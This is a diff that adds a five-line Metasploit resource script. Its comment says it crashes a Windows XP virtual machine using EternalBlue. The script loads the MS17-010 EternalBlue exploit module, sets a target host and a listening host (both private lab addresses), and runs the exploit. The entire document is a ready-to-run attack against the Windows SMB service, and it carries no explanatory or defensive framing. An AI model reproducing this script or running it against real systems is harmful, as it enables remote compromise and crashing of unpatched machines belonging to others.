@@ -1,0 +1,5 @@
+#This script crashes a Windows XP VM using eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.123
+set LHOST 192.168.56.124
+exploit
